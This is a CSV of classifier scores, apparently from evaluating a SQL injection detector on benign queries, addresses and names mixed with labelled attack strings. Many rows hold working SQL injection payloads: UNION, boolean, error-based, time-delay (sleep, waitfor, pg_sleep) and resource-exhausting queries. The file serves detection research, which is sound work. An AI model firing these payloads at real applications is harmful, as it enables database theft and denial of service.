Query,Label,RawMargin,Prob_Raw,Pred_Default,Pred_BestThr,BestThr,BestThr_Margin
14230,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
porteril,0,-4.962100982666016,0.006949575152248144,0,0,0.51,0.040005334613699206
34306,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,9.747822761535645,0.9999415874481201,1,1,0.51,0.040005334613699206
SELECT * FROM thee 3 SELECT * FROM molecular,0,-12.341010093688965,4.368833742773859e-06,0,0,0.51,0.040005334613699206
"-4032""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""olox""  =  ""olox",1,10.156998634338379,0.9999611377716064,1,1,0.51,0.040005334613699206
polvo,0,-4.80619478225708,0.008112571202218533,0,0,0.51,0.040005334613699206
"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",1,14.177179336547852,0.9999992847442627,1,1,0.51,0.040005334613699206
"   SELECT COUNT ( positive ) , sentence FROM ahead BY sometime",0,-11.528056144714355,9.849735761235934e-06,0,0,0.51,0.040005334613699206
"1""   )    )    as eglv where 7412  =  7412 union all select null#",1,9.901040077209473,0.9999499320983887,1,1,0.51,0.040005334613699206
rothamel,0,-4.962100982666016,0.006949575152248144,0,0,0.51,0.040005334613699206
SELECT * FROM native FETCH FIRST 50 PERCENT ROWS ONLY,0,-15.521875381469727,1.8152442748942121e-07,0,0,0.51,0.040005334613699206
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",1,8.894514083862305,0.9998629093170166,1,1,0.51,0.040005334613699206
bic9spide,0,-6.1169562339782715,0.0022003056947141886,0,0,0.51,0.040005334613699206
SELECT * FROM  ( SELECT start FROM production ) ,0,-10.237425804138184,3.5803615901386365e-05,0,0,0.51,0.040005334613699206
SELECT COUNT ( wrong ) FROM work,0,-10.424123764038086,2.9706239729421213e-05,0,0,0.51,0.040005334613699206
SELECT TOP 50 PERCENT * FROM western,0,-10.388204574584961,3.079262387473136e-05,0,0,0.51,0.040005334613699206
1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,9.563841819763184,0.9999297857284546,1,1,0.51,0.040005334613699206
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",1,12.987208366394043,0.9999977350234985,1,1,0.51,0.040005334613699206
SELECT * FROM wet FETCH FIRST 50 PERCENT ROWS ONLY,0,-11.21199893951416,1.351091850665398e-05,0,0,0.51,0.040005334613699206
SELECT COUNT ( DISTINCT purple )  FROM even,0,-10.22170352935791,3.637095869635232e-05,0,0,0.51,0.040005334613699206
-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--,1,14.131650924682617,0.9999992847442627,1,1,0.51,0.040005334613699206
"  SELECT bad,raw FROM spread WHERE current = 'thank' UNION SELECT subject, grow FROM parts",0,-9.844998359680176,5.3008869144832715e-05,0,0,0.51,0.040005334613699206
select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,1,11.119714736938477,0.9999852180480957,1,1,0.51,0.040005334613699206
belalczar,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,1,12.360703468322754,0.9999957084655762,1,1,0.51,0.040005334613699206
SELECT AVG ( essential ) FROM row SELECT SUM ( gradually ) ,0,-12.051985740661621,5.8329269450041465e-06,0,0,0.51,0.040005334613699206
SELECT * FROM give WHERE for = 'fighting'  OR mountain = 'whom',0,-11.915773391723633,6.684092568320921e-06,0,0,0.51,0.040005334613699206
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--,1,14.666031837463379,0.9999995231628418,1,1,0.51,0.040005334613699206
batido,0,-4.914506912231445,0.007285862695425749,0,0,0.51,0.040005334613699206
"1%""   )    )     )  ",1,8.870119094848633,0.9998594522476196,1,1,0.51,0.040005334613699206
SELECT cutting ( s )  FROM other,0,-11.87351131439209,6.9726283982163295e-06,0,0,0.51,0.040005334613699206
-5432'  )   as dndq where 9633  =  9633 order by 1#,1,12.864356994628906,0.9999973773956299,1,1,0.51,0.040005334613699206
camio canexa 161 11?g,0,-9.49118423461914,7.550892041763291e-05,0,0,0.51,0.040005334613699206
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,0,-15.297886848449707,2.2709734537329496e-07,0,0,0.51,0.040005334613699206
2.61077E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
espins marmesat,0,-9.023820877075195,0.00012049029464833438,0,0,0.51,0.040005334613699206
SELECT * FROM them FETCH FIRST 50 PERCENT ROWS ONLY,0,-12.758843421936035,2.8767587991751498e-06,0,0,0.51,0.040005334613699206
SELECT * FROM package WHERE slip = 'dozen'  AND City = 'palace',0,-11.915773391723633,6.684092568320921e-06,0,0,0.51,0.040005334613699206
"c/ alcaices, 23",0,-8.078531265258789,0.00031003003823570907,0,0,0.51,0.040005334613699206
"-5379'  )   union all select 4294,4294,4294--",1,13.709592819213867,0.999998927116394,1,1,0.51,0.040005334613699206
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,1,10.956804275512695,0.9999825954437256,1,1,0.51,0.040005334613699206
SELECT AVG ( hand ) FROM term SELECT SUM ( stomach ) ,0,-9.584894180297852,6.875487451907247e-05,0,0,0.51,0.040005334613699206
SELECT * FROM depth WHERE mountain = 'women' FETCH FIRST 3 ROWS ONLY,0,-15.248513221740723,2.3859138309489936e-07,0,0,0.51,0.040005334613699206
"  SELECT cheeseID AS ID, obtain AS fed FROM stay",0,-10.627531051635742,2.423881414870266e-05,0,0,0.51,0.040005334613699206
"c/ mare de deu de fatima, 165",0,-12.738969802856445,2.934502163043362e-06,0,0,0.51,0.040005334613699206
37311,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
;waitfor delay '0:0:__TIME__'--,1,8.500383377075195,0.9997966885566711,1,1,0.51,0.040005334613699206
6.25525E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
" SELECT * FROM happy ORDER BY power, promised",0,-7.113166809082031,0.0008136496180668473,0,0,0.51,0.040005334613699206
SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,0,-10.27105712890625,3.461955930106342e-05,0,0,0.51,0.040005334613699206
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_2_text' LIMIT 1,0,-8.474970817565918,0.00020858176867477596,0,0,0.51,0.040005334613699206
graydon,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
1' in boolean mode  )   and 4595  =  4595#,1,12.681916236877441,0.9999969005584717,1,1,0.51,0.040005334613699206
"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake )  VALUES  ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )  ",0,-8.107963562011719,0.00030104085453785956,0,0,0.51,0.040005334613699206
wickens@cpanelhost.com.ht,0,-9.082466125488281,0.00011362809163983911,0,0,0.51,0.040005334613699206
SELECT * FROM truth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM hall,0,-12.401593208312988,4.112015176360728e-06,0,0,0.51,0.040005334613699206
"INSERT INTO laugh ( ants, increase, youth, fight, breath, pride )  VALUES  ( 'rough', 'freedom'. victory', 'hardly', 'took', 'standard', 'easier' )  ",0,-8.687219619750977,0.00016870004765223712,0,0,0.51,0.040005334613699206
SELECT COUNT ( wireID ) FROM worth,0,-10.612184524536133,2.461365693307016e-05,0,0,0.51,0.040005334613699206
tabaquera,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
SELECT TOP 50 PERCENT * FROM basket SELECT * FROM record FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM youth,0,-9.680502891540527,6.248616409720853e-05,0,0,0.51,0.040005334613699206
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,367680,367681,367682,367683,367684,367685,367686,30220,262317,30380,80779,30384,30390,80780,290065,291072,320706 )  ORDER BY meta_id ASC",0,-5.536745071411133,0.003923870623111725,0,0,0.51,0.040005334613699206
1 waitfor delay '0:0:10'--,1,7.108889102935791,0.9991828799247742,1,1,0.51,0.040005334613699206
 (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,1,7.910130023956299,0.9996330738067627,1,1,0.51,0.040005334613699206
SELECT * FROM went WHERE slow BETWEEN aware09/01/1996exist AND route15/31/1996smaller,0,-13.13969898223877,1.9656235963338986e-06,0,0,0.51,0.040005334613699206
nanjar viejo,0,-7.123929023742676,0.000804946874268353,0,0,0.51,0.040005334613699206
"calle darsena san magin 198,",0,-7.749948501586914,0.0004305792390368879,0,0,0.51,0.040005334613699206
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",1,13.247922897338867,0.9999982118606567,1,1,0.51,0.040005334613699206
"1"" where 2452  =  2452",1,7.970870494842529,0.9996547698974609,1,1,0.51,0.040005334613699206
feix ablitas,0,-7.123929023742676,0.000804946874268353,0,0,0.51,0.040005334613699206
1%'   )    )     )   order by 1#,1,10.411026000976562,0.9999699592590332,1,1,0.51,0.040005334613699206
SELECT * FROM caught FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM floating,0,-13.488622665405273,1.3866441577192745e-06,0,0,0.51,0.040005334613699206
"1   )    )    as hqwy where 4433  =  4433 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,12.71995735168457,0.9999970197677612,1,1,0.51,0.040005334613699206
SELECT * FROM art WHERE grabbed BETWEEN '1996-07-01' AND '1996-07-31',0,-9.468057632446289,7.72753992350772e-05,0,0,0.51,0.040005334613699206
SELECT * FROM research ORDER BY rush,0,-12.305264472961426,4.527824785327539e-06,0,0,0.51,0.040005334613699206
"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",1,14.13796329498291,0.9999992847442627,1,1,0.51,0.040005334613699206
1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1,4.967789173126221,0.9930896162986755,1,1,0.51,0.040005334613699206
"   SELECT apple,around,brief,traffic,product     (  (  roll JOIN social ON magnet.immediately =  fought.wait )   INNER JOIN citizenON Orders.promised =  brief.gainID ) ",0,-10.284721374511719,3.414973980397917e-05,0,0,0.51,0.040005334613699206
urea bernat,0,-9.788888931274414,5.606801641988568e-05,0,0,0.51,0.040005334613699206
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",1,9.337350845336914,0.999911904335022,1,1,0.51,0.040005334613699206
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,1,13.050232887268066,0.9999978542327881,1,1,0.51,0.040005334613699206
SELECT AVG ( second ) FROM hill SELECT SUM ( brother ) ,0,-11.120052337646484,1.4812085282756016e-05,0,0,0.51,0.040005334613699206
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,9.558256149291992,0.9999294281005859,1,1,0.51,0.040005334613699206
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",1,9.255298614501953,0.9999043941497803,1,1,0.51,0.040005334613699206
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",1,13.414362907409668,0.9999984502792358,1,1,0.51,0.040005334613699206
"  SELECT needed AS duck, fire AS [automobile]  FROM throughout",0,-13.383580207824707,1.5402254120999714e-06,0,0,0.51,0.040005334613699206
SELECT MIN ( brain )  AS golden FROM individual,0,-10.634398460388184,2.4072931410046294e-05,0,0,0.51,0.040005334613699206
SELECT * FROM between WHERE palace  BETWEEN 10 AND 20,0,-9.265804290771484,9.459567081648856e-05,0,0,0.51,0.040005334613699206
94lp90ulo,0,-7.964883804321289,0.0003473313990980387,0,0,0.51,0.040005334613699206
SELECT * FROM mouth WHERE copy = 'universe'  OR done = 'men',0,-11.933666229248047,6.5655599428282585e-06,0,0,0.51,0.040005334613699206
enaltecedor,0,-8.16177749633789,0.00028527333051897585,0,0,0.51,0.040005334613699206
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1,8.00171947479248,0.9996652603149414,1,1,0.51,0.040005334613699206
SELECT AVG ( kind )  FROM strike  SELECT SUM ( cookies ) ,0,-10.841339111328125,1.957301537913736e-05,0,0,0.51,0.040005334613699206
"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,11.729302406311035,0.9999918937683105,1,1,0.51,0.040005334613699206
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1,12.735231399536133,0.9999970197677612,1,1,0.51,0.040005334613699206
amedee@spainbb.cc,0,-7.6011433601379395,0.0004996297648176551,0,0,0.51,0.040005334613699206
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp",1,11.689380645751953,0.9999916553497314,1,1,0.51,0.040005334613699206
"  SELECT aroundID AS ID, appearance AS aid FROM child",0,-14.275887489318848,6.310453386504378e-07,0,0,0.51,0.040005334613699206
"-4807' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'wwki'  =  'wwki",1,8.424620628356934,0.9997807145118713,1,1,0.51,0.040005334613699206
SELECT Count ( * )  AS badly,0,-8.994945526123047,0.0001240197743754834,0,0,0.51,0.040005334613699206
"1"" union all select null,null--",1,5.9655961990356445,0.9974410533905029,1,1,0.51,0.040005334613699206
SELECT MIN ( symbol )  AS while FROM hurried,0,-10.237067222595215,3.58164579665754e-05,0,0,0.51,0.040005334613699206
SELECT AVG ( locate )  FROM pilot  SELECT SUM ( practice ) ,0,-11.567716598510742,9.466739356867038e-06,0,0,0.51,0.040005334613699206
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",1,13.480511665344238,0.9999985694885254,1,1,0.51,0.040005334613699206
" end and    (    (     (  ""poee""  =  ""poee",1,8.048938751220703,0.9996806383132935,1,1,0.51,0.040005334613699206
"  SELECT Orders.ninerID, Employees.teach, Employees.canal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.straightID ORDER BY Orders.compoundID",0,-10.218828201293945,3.647568519227207e-05,0,0,0.51,0.040005334613699206
SELECT creature FROM pole UNION ALL SELECT involved FROM slip ORDER BY want,0,-10.27105712890625,3.461955930106342e-05,0,0,0.51,0.040005334613699206
1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,1,11.856476783752441,0.9999929666519165,1,1,0.51,0.040005334613699206
"calle san isidro labrador 188, 13?h",0,-6.908132076263428,0.0009986249497160316,0,0,0.51,0.040005334613699206
8.04948E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
8855,0,-7.25226354598999,0.0007080669165588915,0,0,0.51,0.040005334613699206
"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,13.623884201049805,0.9999988079071045,1,1,0.51,0.040005334613699206
6.51129E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
bartlett@waterflyesp.eh,0,-9.534907341003418,7.227880996651947e-05,0,0,0.51,0.040005334613699206
1'||  (  select 'lkmh' where 7659  =  7659,1,9.127836227416992,0.9998914003372192,1,1,0.51,0.040005334613699206
"   SELECT shot,bigger,needed,population,beyond     (  (  forth JOIN discuss ON thrown.number =  trouble.produce )   INNER JOIN indicateON Orders.arrive =  neck.unusualID ) ",0,-10.284721374511719,3.414973980397917e-05,0,0,0.51,0.040005334613699206
SELECT TOP 3 * FROM round SELECT * FROM pig 3SELECT * FROM pan,0,-7.642858982086182,0.00047922597150318325,0,0,0.51,0.040005334613699206
SELECT slipped FROM drove UNION SELECT alone FROM name ORDER BY planning,0,-12.212738037109375,4.966759206581628e-06,0,0,0.51,0.040005334613699206
rainmake,0,-4.962100982666016,0.006949575152248144,0,0,0.51,0.040005334613699206
antonio juez 67 3?a,0,-11.224687576293945,1.3340569239517208e-05,0,0,0.51,0.040005334613699206
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,1,8.458574295043945,0.9997879862785339,1,1,0.51,0.040005334613699206
"c/ francisco javier simonet 7, 11?e",0,-8.710343360900879,0.0001648444595048204,0,0,0.51,0.040005334613699206
